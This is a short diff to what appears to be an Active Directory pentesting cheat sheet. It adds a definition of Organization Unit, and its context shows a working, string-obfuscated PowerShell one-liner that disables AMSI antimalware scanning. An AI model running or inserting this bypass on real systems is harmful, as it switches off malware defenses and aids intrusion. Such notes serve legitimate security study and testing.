@@ -7,7 +7,7 @@
 * Replication Service: synchronizes information about objects between all Domain Controllers
 * Forest: a security boundary that includes several domains
 * Domain: identified as a SID, contains several Organization Units
-* Organization Unit (OU):
+* Organization Unit (OU): the smallest container within a domain. Can be used to store users, groups or computers.
 
 ### Access control
 
@@ -39,7 +39,6 @@ Obfuscated strings to disable AMSI PowerShell protection
 
 ```
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
-
 ```
 
 ### Including External Scripts
